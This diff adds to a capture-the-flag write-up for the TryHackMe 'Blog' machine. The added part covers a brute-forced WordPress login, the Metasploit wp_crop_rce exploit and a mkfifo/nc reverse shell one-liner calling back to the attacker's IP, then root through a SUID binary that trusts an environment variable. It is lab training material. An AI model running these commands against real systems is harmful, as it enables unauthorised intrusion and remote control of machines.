@@ -150,6 +150,10 @@ Login page was also present on `http://blog.thm/wp-login.php`
 
 As this website was built using WordPress, I instantly enumerated it using wpscan for usernames, vulnerable plugins, vulnerable themes etc.
 
+***
+
+### WordPress Dashboard access as kwheel
+
 ```
 ┌──(ghost㉿kali)-[~/tryhackme/blog]
 └─$ wpscan --url "blog.thm" -e u, vp, vt --no-update
@@ -178,3 +182,108 @@ Next, I brute forced the password for kwheel user using hydra and found a valid 
 
 <figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
 
+Tried to log on WordPress login page with that found credentials and logged in as kwheel.
+
+<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Shell as www-data
+
+I searched for potential exploit on google for that particular version of WordPress 5.0 and there I found a public Metasploit exploit available on [exploit-db](https://www.exploit-db.com/exploits/46662) for that version of WordPress.
+
+{% embed url="https://www.exploit-db.com/exploits/46662" %}
+
+I searched for that crop-image module through msfconsole and found that module.
+
+<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>
+
+I used that module and set some of the options needed to run that payload successfully.
+
+```
+msf6 exploit(multi/http/wp_crop_rce) > set LHOST <kali-machine-IP>
+LHOST => 10.17.87.131
+msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
+RHOSTS => blog.thm
+msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD REDACTED
+PASSWORD => cutiepie1
+msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
+USERNAME => kwheel
+msf6 exploit(multi/http/wp_crop_rce) > run
+```
+
+Running that module provided me with a meterpreter shell.
+
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+
+I created a reverse shell file inside /tmp folder of target machine. Triggering that shell there provided me with a reverse shell connection and a better shell then previous one.
+
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4445 >/tmp/f' > rev.sh
+chmod +x rev.sh
+./rev.sh
+```
+
+<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+### Shell as Root
+
+There was a fake user.txt present inside bjoel's home directory.
+
+<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+
+Next, I tried multiple steps to gain higher privileges like password resuse, connecting to mysql database through the password I found inside wp-config.php file , but that didn't worked.
+
+While enumerating for SUID files, I found an interesting binary <mark style="color:red;">/usr/bin/checker</mark> which was owned by root.
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+I tried running that binary and got a message - <mark style="color:yellow;">Not an Admin</mark>
+
+<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+Next, I tried running it with <mark style="color:red;">`ltrace`</mark> to get more detail about it's running process.
+
+{% hint style="info" %}
+`ltrace` is a command-line debugging and diagnostic utility in Linux. Its primary function is to trace and display the calls made by a userspace application to shared libraries. It achieves this by intercepting and recording the dynamic library calls and the signals received by the traced process.
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
+
+Looks like it's checking value of environment variable 'admin' if it's nil (or not present) then , it is just printing 'Not an Admin'. And what if we set our environment variable 'admin' to 1.
+
+<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+
+Ok, now as we run that binary again, it will set our uid to 0(root) and will spawn a /bin/bash shell as root.
+
+<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+Grabbed the root flag
+
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Now, just user flag is remaining, which I found using the following command:
+
+```
+find / -type f -name "user*" 2>/dev/null
+```
+
+<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+Grabbed the user flag
+
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+That's it for this machine.✅
